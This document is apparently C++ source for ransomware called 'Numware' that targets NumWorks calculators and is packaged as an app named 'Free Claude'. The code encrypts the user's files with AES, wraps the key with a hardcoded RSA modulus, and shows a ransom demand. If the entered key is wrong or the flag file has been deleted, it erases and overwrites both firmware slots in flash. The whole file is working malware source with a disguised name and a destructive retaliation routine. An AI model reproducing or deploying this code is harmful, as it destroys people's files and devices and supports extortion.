#include "eadkpp.h"

#include "libs/storage/storage.h"
#include "libs/tiny-bignum-c/bn.h"
#include "encryption/aes.h"
#include "encryption/rsa.h"
#include "encryption/types.h"

#include "userland/userland_A_n0110.h"
#include "userland/userland_B_n0110.h"
#include "userland/userland_A_n0120.h"
#include "userland/userland_B_n0120.h"

#include "libs/jump.h"
#include "libs/flash/flash_write_with_interruptions.h"
#include "libs/flash/flash_information.h"

#include <cstring>

extern const char eadk_app_name[] __attribute__((section(".rodata.eadk_app_name"))) = "Free Claude";
extern const uint32_t eadk_api_level __attribute__((section(".rodata.eadk_api_level"))) = 0;

extern "C" {
    void _exit(int status) {
        while (1);
    }

    int _kill(int pid, int sig) {
        return -1;
    }

    int _getpid(void) {
        return 1;
    }
}  // just for compilation. Not used

#define MAX_FILES 20
#define MAX_FILE_SIZE 32 * 1024
#define USERLAND_SIZE 2048

const char *str_n = "8780b2c366940084dbe589b6f4301106ee1d33c30ba2189f39dffbf34a94a8c9";  // we can change it

using namespace EADK;

bool get_current_slot(int model){  // return true for slot B
    if (model == 1){  // n0110 or n0115
        return extapp_userlandAddress() >= 0x90410000;
    }
    return extapp_userlandAddress() >= 0x90420000;
}

void detroySlots(){
    Display::drawString("Bad key, destruction of slots", Point(10, 220), false, Color(0xFF0000), Color(0x000000));
    Timing::msleep(1000);

    uint8_t *slot = nullptr;
    uint32_t jump_address;
    const uint8_t * userland_buffer;

    if (extapp_calculatorModel() == 1){  // n0110 or n0115
        if (get_current_slot(1)){ // we are in slot B
            slot = reinterpret_cast<uint8_t*>(0x90010000); // we want to write and jump on slot A
            jump_address = 0x90010000 + 0x30;
            userland_buffer = reinterpret_cast<const uint8_t *>(&output_userland_A_n0110_bin); // same bin file for n0110 and n0115
        }else{
            slot = reinterpret_cast<uint8_t*>(0x90410000);
            jump_address = 0x90410000 + 0x30;
            userland_buffer = reinterpret_cast<const uint8_t *>(&output_userland_B_n0110_bin);
        }
    } else {  // n0120
        if (get_current_slot(1)){ // we are in slot B
            slot = reinterpret_cast<uint8_t*>(0x90020000);
            jump_address = 0x90020000 + 0x30;
            userland_buffer = reinterpret_cast<const uint8_t *>(&output_userland_A_n0120_bin);
        }else{
            slot = reinterpret_cast<uint8_t*>(0x90420000);
            jump_address = 0x90420000 + 0x30;
            userland_buffer = reinterpret_cast<const uint8_t *>(&output_userland_B_n0120_bin);
        }
    }

    static uint8_t ram_buffer[USERLAND_SIZE];
    std::memcpy(ram_buffer, userland_buffer, USERLAND_SIZE);

    int sector_index = Ion::Device::Flash::SectorAtAddress(reinterpret_cast<uint32_t>(slot));
    if (sector_index != -1) {
        Ion::Device::Flash::EraseSectorWithInterruptions(sector_index, true);

        Ion::Device::Flash::WriteMemoryWithInterruptions(slot, ram_buffer, USERLAND_SIZE, true);

        Display::pushRectUniform(Rect(0, 0, EADK_SCREEN_WIDTH, EADK_SCREEN_HEIGHT), Color(0x000000));
        jump(jump_address);
    }
}

void crypt_all_files(){
    const char * temp_filenames[MAX_FILES];
    int nb = extapp_fileList((const char **)temp_filenames, MAX_FILES, "");

    if (nb == -1) {
        return;
    }

    char filenames_copy[MAX_FILES][64];
    int nb_files = 0;
    for (int i = 0; i < nb; i++) {
        std::strncpy(filenames_copy[i], temp_filenames[i], sizeof(filenames_copy[i]));
        filenames_copy[i][sizeof(filenames_copy[i]) - 1] = '\0';
        nb_files++;
    }

    // generate the AES key
    Encryption::int256 key = {0};
    uint8_t *bytes = reinterpret_cast<uint8_t*>(key.array);
    
    for (size_t i = 0; i < 16; i += 4) {
        uint32_t r = eadk_random();
        bytes[i] = (r >> 0)  & 0xFF;
        bytes[i + 1] = (r >> 8)  & 0xFF;
        bytes[i + 2] = (r >> 16) & 0xFF;
        bytes[i + 3] = (r >> 24) & 0xFF;
    }

    // crypt each files
    for (int fileIndex = 0; fileIndex < nb; fileIndex++) {
        char *current_filename = filenames_copy[fileIndex];

        if (strcmp(current_filename, "gp.sys") == 0 || 
        strcmp(current_filename, "pr.sys") == 0 || 
        strcmp(current_filename, "key.aes") == 0 || 
        strcmp(current_filename, "flag.aes") == 0) continue;

        size_t file_len = 0;
        const char * content = extapp_fileRead(current_filename, &file_len);

        static uint8_t buf[MAX_FILE_SIZE] = {0};
        std::memcpy(buf, content, file_len);

        int remainder = file_len % 16;
        int pad_value = 16 - remainder;
        size_t total_encrypted_size = file_len + pad_value;

        Encryption::AES::crypt(buf, file_len, key);

        extapp_fileErase(current_filename);

        extapp_fileWrite(current_filename, reinterpret_cast<const char *>(buf), total_encrypted_size);
    }

    // save the AES key
    Encryption::int256 n = {0};
    bignum_from_string(reinterpret_cast<struct bn*>(&n), const_cast<char*>(str_n), std::strlen(str_n));
    
    Encryption::int256 e = {0};
    const char *str_e = "00010001";
    bignum_from_string(reinterpret_cast<struct bn*>(&e), const_cast<char*>(str_e), std::strlen(str_e));

    Encryption::int256 result = Encryption::RSA::crypt(key, n, e);

    extapp_fileWrite("key.aes", reinterpret_cast<const char*>(&result), sizeof(result));

    // save a flag file
    Encryption::int256 flag = {0};
    bignum_from_int(reinterpret_cast<struct bn*>(&flag), 0xFA023AEB);
    Encryption::int256 flag_result = Encryption::RSA::crypt(flag, n, e);
    extapp_fileWrite("flag.aes", reinterpret_cast<const char*>(&flag_result), sizeof(flag_result));
}

void uncrypt_all_files(const char * str_d){
    if (std::strlen(str_d) < 64){
        // bad key
        detroySlots();
    }

    // get AES key and decrypt files
    size_t file_len = 0;
    const char * content = extapp_fileRead("key.aes", &file_len);

    Encryption::int256 crypted_key;
    std::memcpy(&crypted_key, content, sizeof(crypted_key));

    Encryption::int256 n = {0};
    bignum_from_string(reinterpret_cast<struct bn*>(&n), const_cast<char*>(str_n), std::strlen(str_n));

    Encryption::int256 d = {0};
    bignum_from_string(reinterpret_cast<struct bn*>(&d), const_cast<char*>(str_d), std::strlen(str_d));

    // We check if the RSA private key is correct with the flag
    size_t file_flag_len = 0;
    const char * flag_content_crypted = extapp_fileRead("flag.aes", &file_flag_len);
    if (flag_content_crypted == NULL) {
        // the flag file was removed so we destroy slots in retaliation
        detroySlots();
    }

    Encryption::int256 flag = {0};
    bignum_from_int(reinterpret_cast<struct bn*>(&flag), 0xFA023AEB);

    Encryption::int256 crypted_flag;
    std::memcpy(&crypted_flag, flag_content_crypted, sizeof(crypted_flag));
    
    Encryption::int256 uncrypt_flag = Encryption::RSA::uncrypt(crypted_flag, n, d);
    if (bignum_cmp(reinterpret_cast<struct bn*>(&uncrypt_flag), reinterpret_cast<struct bn*>(&flag)) != EQUAL){
        // bad private key
        detroySlots();
    }
    Encryption::int256 aes_key = Encryption::RSA::uncrypt(crypted_key, n, d);

    const char * temp_filenames[MAX_FILES];
    int nb = extapp_fileList((const char **)temp_filenames, MAX_FILES, "");

    if (nb == -1) {
        return;
    }

    char filenames_copy[MAX_FILES][65]; // 65 for 64 key + \0
    int nb_files = 0;
    for (int i = 0; i < nb; i++) {
        std::strncpy(filenames_copy[i], temp_filenames[i], sizeof(filenames_copy[i]));
        filenames_copy[i][sizeof(filenames_copy[i]) - 1] = '\0';
        nb_files++;
    }

    for (int fileIndex = 0; fileIndex < nb; fileIndex++) {
        char *current_filename = filenames_copy[fileIndex];

        if (strcmp(current_filename, "gp.sys") == 0 || 
        strcmp(current_filename, "pr.sys") == 0 || 
        strcmp(current_filename, "key.aes") == 0 || 
        strcmp(current_filename, "flag.aes") == 0) continue;

        size_t file_len = 0;
        const char * content = extapp_fileRead(current_filename, &file_len);

        static uint8_t buf[MAX_FILE_SIZE] = {0};
        std::memcpy(buf, content, file_len);

        int new_size = Encryption::AES::uncrypt(buf, file_len, aes_key);

        extapp_fileErase(current_filename);

        extapp_fileWrite(current_filename, reinterpret_cast<const char *>(buf), new_size);
    }

    extapp_fileErase("key.aes");
    extapp_fileErase("flag.aes");
}

static const char* char_for_key(eadk_key_t k) {
  switch (k) {
    case eadk_key_ans:             return "ans";
    case eadk_key_backspace:           return "back";
    case eadk_key_exp:            return "a";
    case eadk_key_ln:             return "b";
    case eadk_key_log:            return "c";
    case eadk_key_imaginary:      return "d";
    case eadk_key_comma:          return "e";
    case eadk_key_power:          return "f";
    case eadk_key_seven:          return "7";
    case eadk_key_eight:          return "8";
    case eadk_key_nine:           return "9";
    case eadk_key_four:           return "4";
    case eadk_key_five:           return "5";
    case eadk_key_six:            return "6";
    case eadk_key_one:            return "1";
    case eadk_key_two:            return "2";
    case eadk_key_three:          return "3";
    case eadk_key_zero:           return "0";
    default:                      return "?";
  }
}

static const char * get_pressed_key_name(eadk_keyboard_state_t state) {
    for (uint8_t i = 0; i < 64; i++) {
        if (eadk_keyboard_key_down(state, static_cast<eadk_key_t>(i))) {
            const char* value = char_for_key(static_cast<eadk_key_t>(i));
            return value;
        }
    }
    return nullptr;
}

int main(int argc, char * argv[]) {
    Display::pushRectUniform(Rect(0, 0, EADK_SCREEN_WIDTH, EADK_SCREEN_HEIGHT), Color(0x000000));

    Display::drawString("This is the Numware ransomware.", Point(10, 10), false, Color(0x00FF00), Color(0x000000));
    Display::drawString("All your files have been encrypted.", Point(10, 30), false, Color(0xFF0000), Color(0x000000));
    Display::drawString("To recover them, pay me 32 GB of DDR5 RAM", Point(10, 50), false, Color(0x00FF00), Color(0x000000));
    Display::drawString("to get the recovery code.", Point(10, 70), false, Color(0x00FF00), Color(0x000000));
    Display::drawString("If the code is wrong, your 2 slots", Point(10, 90), false, Color(0xFF0000), Color(0x000000));
    Display::drawString("will be corrupted.", Point(10, 110), false, Color(0xFF0000), Color(0x000000));

    Display::drawString("Private key : (tap Ans to validate)", Point(10, 140), false, Color(0x0000FF), Color(0x000000));

    // crypt files
    size_t file_flag_len = 0;
    const char * flag_content_crypted = extapp_fileRead("flag.aes", &file_flag_len);
    if (flag_content_crypted == NULL) {
        // the file doesn't exist so we crypt thhe files. If it exist, the files are already crypted
        crypt_all_files();
    }

    // read keyborad to enter private key
    char private_key[65];
    std::memset(private_key, 0, sizeof(private_key));
    int offset = 0;
    const int max_len = sizeof(private_key);

    while (true) {
        eadk_keyboard_state_t kb = eadk_keyboard_scan();
        const char *new_val = get_pressed_key_name(kb);

        if (new_val == nullptr) {
            Timing::msleep(10);
            continue;
        }

        if (strcmp(new_val, "ans") == 0) {
            private_key[offset] = '\0';
            Display::drawString("Decryption", Point(10, 200), false, Color(0x0000FF), Color(0x000000));
            uncrypt_all_files(private_key);
            Display::drawString("The files have been decrypted", Point(10, 220), false, Color(0x0000FF), Color(0x000000));
            break;
        } 
        else if (strcmp(new_val, "back") == 0) {
            if (offset > 0) {
                offset--;
                private_key[offset] = '\0';
                
                char line1[33] = {0};
                char line2[33] = {0};
                if (offset <= 32) {
                    std::memcpy(line1, private_key, offset);
                } else {
                    std::memcpy(line1, private_key, 32);
                    std::memcpy(line2, private_key + 32, offset - 32);
                }

                Display::pushRectUniform(Rect(10, 160, EADK_SCREEN_WIDTH - 20, 16), Color(0x000000));
                Display::pushRectUniform(Rect(10, 180, EADK_SCREEN_WIDTH - 20, 16), Color(0x000000));
                
                Display::drawString(line1, Point(10, 160), false, Color(0x0000FF), Color(0x000000));
                Display::drawString(line2, Point(10, 180), false, Color(0x0000FF), Color(0x000000));
            }
        } 
        else if (strcmp(new_val, "?") != 0) {
            if (offset < max_len - 1) {
                private_key[offset] = new_val[0]; 
                offset++;
                private_key[offset] = '\0';
                
                char line1[33] = {0};
                char line2[33] = {0};
                if (offset <= 32) {
                    std::memcpy(line1, private_key, offset);
                } else {
                    std::memcpy(line1, private_key, 32);
                    std::memcpy(line2, private_key + 32, offset - 32);
                }

                Display::pushRectUniform(Rect(10, 160, EADK_SCREEN_WIDTH, 16), Color(0x000000));
                Display::pushRectUniform(Rect(10, 180, EADK_SCREEN_WIDTH, 16), Color(0x000000));
                
                Display::drawString(line1, Point(10, 160), false, Color(0x0000FF), Color(0x000000));
                Display::drawString(line2, Point(10, 180), false, Color(0x0000FF), Color(0x000000));
            }
        }
        
        Timing::msleep(200);
    }
}
